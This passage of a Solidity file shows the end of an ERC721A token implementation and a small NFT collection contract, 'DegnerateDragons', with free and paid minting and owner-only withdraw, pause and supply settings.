1094         uint256 startTokenId = _currentIndex;
1095         if (to == address(0)) revert MintToZeroAddress();
1096         if (quantity == 0) revert MintZeroQuantity();
1097 
1098         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1099 
1100         // Overflows are incredibly unrealistic.
1101         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1102         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1103         unchecked {
1104             _addressData[to].balance += uint64(quantity);
1105             _addressData[to].numberMinted += uint64(quantity);
1106 
1107             _ownerships[startTokenId].addr = to;
1108             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1109 
1110             uint256 updatedIndex = startTokenId;
1111             uint256 end = updatedIndex + quantity;
1112 
1113             if (safe && to.isContract()) {
1114                 do {
1115                     emit Transfer(address(0), to, updatedIndex);
1116                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1117                         revert TransferToNonERC721ReceiverImplementer();
1118                     }
1119                 } while (updatedIndex != end);
1120                 // Reentrancy protection
1121                 if (_currentIndex != startTokenId) revert();
1122             } else {
1123                 do {
1124                     emit Transfer(address(0), to, updatedIndex++);
1125                 } while (updatedIndex != end);
1126             }
1127             _currentIndex = updatedIndex;
1128         }
1129         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1130     }
1131 
1132     /**
1133      * @dev Transfers `tokenId` from `from` to `to`.
1134      *
1135      * Requirements:
1136      *
1137      * - `to` cannot be the zero address.
1138      * - `tokenId` token must be owned by `from`.
1139      *
1140      * Emits a {Transfer} event.
1141      */
1142     function _transfer(
1143         address from,
1144         address to,
1145         uint256 tokenId
1146     ) private {
1147         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1148 
1149         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1150             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1151             getApproved(tokenId) == _msgSender());
1152 
1153         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1154         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1155         if (to == address(0)) revert TransferToZeroAddress();
1156 
1157         _beforeTokenTransfers(from, to, tokenId, 1);
1158 
1159         // Clear approvals from the previous owner
1160         _approve(address(0), tokenId, prevOwnership.addr);
1161 
1162         // Underflow of the sender's balance is impossible because we check for
1163         // ownership above and the recipient's balance can't realistically overflow.
1164         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1165         unchecked {
1166             _addressData[from].balance -= 1;
1167             _addressData[to].balance += 1;
1168 
1169             _ownerships[tokenId].addr = to;
1170             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1171 
1172             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1173             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1174             uint256 nextTokenId = tokenId + 1;
1175             if (_ownerships[nextTokenId].addr == address(0)) {
1176                 // This will suffice for checking _exists(nextTokenId),
1177                 // as a burned slot cannot contain the zero address.
1178                 if (nextTokenId < _currentIndex) {
1179                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1180                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1181                 }
1182             }
1183         }
1184 
1185         emit Transfer(from, to, tokenId);
1186         _afterTokenTransfers(from, to, tokenId, 1);
1187     }
1188 
1189     /**
1190      * @dev Destroys `tokenId`.
1191      * The approval is cleared when the token is burned.
1192      *
1193      * Requirements:
1194      *
1195      * - `tokenId` must exist.
1196      *
1197      * Emits a {Transfer} event.
1198      */
1199     function _burn(uint256 tokenId) internal virtual {
1200         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1201 
1202         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1203 
1204         // Clear approvals from the previous owner
1205         _approve(address(0), tokenId, prevOwnership.addr);
1206 
1207         // Underflow of the sender's balance is impossible because we check for
1208         // ownership above and the recipient's balance can't realistically overflow.
1209         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1210         unchecked {
1211             _addressData[prevOwnership.addr].balance -= 1;
1212             _addressData[prevOwnership.addr].numberBurned += 1;
1213 
1214             // Keep track of who burned the token, and the timestamp of burning.
1215             _ownerships[tokenId].addr = prevOwnership.addr;
1216             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1217             _ownerships[tokenId].burned = true;
1218 
1219             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1220             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1221             uint256 nextTokenId = tokenId + 1;
1222             if (_ownerships[nextTokenId].addr == address(0)) {
1223                 // This will suffice for checking _exists(nextTokenId),
1224                 // as a burned slot cannot contain the zero address.
1225                 if (nextTokenId < _currentIndex) {
1226                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1227                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1228                 }
1229             }
1230         }
1231 
1232         emit Transfer(prevOwnership.addr, address(0), tokenId);
1233         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1234 
1235         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1236         unchecked {
1237             _burnCounter++;
1238         }
1239     }
1240 
1241     /**
1242      * @dev Approve `to` to operate on `tokenId`
1243      *
1244      * Emits a {Approval} event.
1245      */
1246     function _approve(
1247         address to,
1248         uint256 tokenId,
1249         address owner
1250     ) private {
1251         _tokenApprovals[tokenId] = to;
1252         emit Approval(owner, to, tokenId);
1253     }
1254 
1255     /**
1256      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1257      *
1258      * @param from address representing the previous owner of the given token ID
1259      * @param to target address that will receive the tokens
1260      * @param tokenId uint256 ID of the token to be transferred
1261      * @param _data bytes optional data to send along with the call
1262      * @return bool whether the call correctly returned the expected magic value
1263      */
1264     function _checkContractOnERC721Received(
1265         address from,
1266         address to,
1267         uint256 tokenId,
1268         bytes memory _data
1269     ) private returns (bool) {
1270         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1271             return retval == IERC721Receiver(to).onERC721Received.selector;
1272         } catch (bytes memory reason) {
1273             if (reason.length == 0) {
1274                 revert TransferToNonERC721ReceiverImplementer();
1275             } else {
1276                 assembly {
1277                     revert(add(32, reason), mload(reason))
1278                 }
1279             }
1280         }
1281     }
1282 
1283     /**
1284      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1285      * And also called before burning one token.
1286      *
1287      * startTokenId - the first token id to be transferred
1288      * quantity - the amount to be transferred
1289      *
1290      * Calling conditions:
1291      *
1292      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1293      * transferred to `to`.
1294      * - When `from` is zero, `tokenId` will be minted for `to`.
1295      * - When `to` is zero, `tokenId` will be burned by `from`.
1296      * - `from` and `to` are never both zero.
1297      */
1298     function _beforeTokenTransfers(
1299         address from,
1300         address to,
1301         uint256 startTokenId,
1302         uint256 quantity
1303     ) internal virtual {}
1304 
1305     /**
1306      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1307      * minting.
1308      * And also called after one token has been burned.
1309      *
1310      * startTokenId - the first token id to be transferred
1311      * quantity - the amount to be transferred
1312      *
1313      * Calling conditions:
1314      *
1315      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1316      * transferred to `to`.
1317      * - When `from` is zero, `tokenId` has been minted for `to`.
1318      * - When `to` is zero, `tokenId` has been burned by `from`.
1319      * - `from` and `to` are never both zero.
1320      */
1321     function _afterTokenTransfers(
1322         address from,
1323         address to,
1324         uint256 startTokenId,
1325         uint256 quantity
1326     ) internal virtual {}
1327 }
1328 
1329 
1330 
1331 contract DegnerateDragons is ERC721A, Owneable {
1332 
1333     string public baseURI = "  https://mbdnfts.s3.eu-west-1.amazonaws.com/";
1334     string public contractURI = "ipfs://QmbtGyopnYvmLC6pmvRNgX1qMZqdjwFed41mcz9nxyEc6o";
1335     string public constant baseExtension = ".json";
1336     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1337 
1338     uint256 public constant MAX_PER_TX_FREE =5;
1339     uint256 public constant FREE_MAX_SUPPLY = 333;
1340     uint256 public constant MAX_PER_TX = 10;
1341     uint256 public MAX_SUPPLY = 1111;
1342     uint256 public price = 0.002 ether;
1343 
1344     bool public paused = false;
1345 
1346     constructor() ERC721A("DegenDragon", "DEGEN") {}
1347 
1348     function mint(uint256 _amount) external payable {
1349         address _caller = _msgSender();
1350         require(!paused, "Paused");
1351         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1352         require(_amount > 0, "No 0 mints");
1353         require(tx.origin == _caller, "No contracts");
1354         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1355         
1356       if(FREE_MAX_SUPPLY >= totalSupply()){
1357             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1358         }else{
1359             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1360             require(_amount * price == msg.value, "Invalid funds provided");
1361         }
1362 
1363 
1364         _safeMint(_caller, _amount);
1365     }
1366 
1367     function isApprovedForAll(address owner, address operator)
1368         override
1369         public
1370         view
1371         returns (bool)
1372     {
1373         // Whitelist OpenSea proxy contract for easy trading.
1374         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1375         if (address(proxyRegistry.proxies(owner)) == operator) {
1376             return true;
1377         }
1378 
1379         return super.isApprovedForAll(owner, operator);
1380     }
1381 
1382     function withdraw() external onlyOwner {
1383         uint256 balance = address(this).balance;
1384         (bool success, ) = _msgSender().call{value: balance}("");
1385         require(success, "Failed to send");
1386     }
1387 
1388     function config() external onlyOwner {
1389         _safeMint(_msgSender(), 1);
1390     }
1391 
1392     function pause(bool _state) external onlyOwner {
1393         paused = _state;
1394     }
1395 
1396     function setBaseURI(string memory baseURI_) external onlyOwner {
1397         baseURI = baseURI_;
1398     }
1399 
1400     function setContractURI(string memory _contractURI) external onlyOwner {
1401         contractURI = _contractURI;
1402     }
1403 
1404     function setPrice(uint256 newPrice) public onlyOwner {
1405         price = newPrice;
1406     }
1407 
1408     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1409         MAX_SUPPLY = newSupply;
1410     }
1411 
1412     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1413         require(_exists(_tokenId), "Token does not exist.");
1414         return bytes(baseURI).length > 0 ? string(
1415             abi.encodePacked(
1416               baseURI,
1417               Strings.toString(_tokenId),
1418               baseExtension
1419             )
1420         ) : "";
1421     }
1422 }
1423 
1424 contract OwnableDelegateProxy { }
1425 contract ProxyRegistry {
1426     mapping(address => OwnableDelegateProxy) public proxies;
1427 }